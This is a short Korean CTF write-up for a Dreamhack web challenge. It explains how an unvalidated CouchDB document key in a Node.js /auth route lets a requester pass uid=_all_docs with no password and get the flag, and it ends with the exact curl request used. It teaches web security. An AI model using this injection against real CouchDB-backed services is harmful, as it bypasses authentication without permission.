created: 2026-01-19 20:39
category: #web 
link: https://dreamhack.io/wargame/challenges/419

# Write-up
```javascript
const nano = require('nano')(`http://${process.env.COUCHDB_USER}:${process.env.COUCHDB_PASSWORD}@couchdb:5984`);
const users = nano.db.use('users');
```
- 우선 `nano`라는 게 무엇인지 찾아보니, couchDB를 위한 클라이언트라고 하였다. 
- 해당 코드는 `nano`를 통해 `users` 데이터베이스를 사용하는 것으로 보였다.

```javascript
app.post('/auth', function(req, res) {
    users.get(req.body.uid, function(err, result) {
        if (err) {
            console.log(err);
            res.send('error');
            return;
        }
        if (result.upw === req.body.upw) {
            res.send(`FLAG: ${process.env.FLAG}`);
        } else {
            res.send('fail');
        }
    });
});
```
- `/auth` API를 보면 `users` 데이터베이스에서 `req.body.uid`로 값을 획득한다.
- 이 때 키 값에 해당되는 `req.body.uid`에 대한 검증이 안되어 있는걸로 보아 이를 통해 인증을 우회할 수 있을 것으로 보였다.

couchDB에서 `/{DB이름}/_all_docs`로 조회하게 되면 지정된 데이터베이스에 대한 모든 도큐먼트를 반환한다고 한다. 이 때 반환 값에는 `upw`가 없다. (구조가 달라서)
따라서 위 `/auth` API 코드 상에서 `result.upw`는 `undefined`가 될 것이다. 그러므로 `upw`에 아무런 입력 값을 주지 않으면 `req.body.upw` 또한 `undefined`가 되어서 인증이 통과될 것이다. 

최종적으로 다음과 같은 `curl` 명령어를 통해 요청을 전송하였고 정상적으로 플래그 값을 획득할 수 있었다.
```shell
curl -d "uid=_all_docs" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://host8.dreamhack.games:19585/auth
```

# Reference
- https://minseosavestheworld.tistory.com/153
- https://github.com/apache/couchdb-nano
- https://hg2lee.tistory.com/entry/Apache-CouchDB-CouchDB-Injection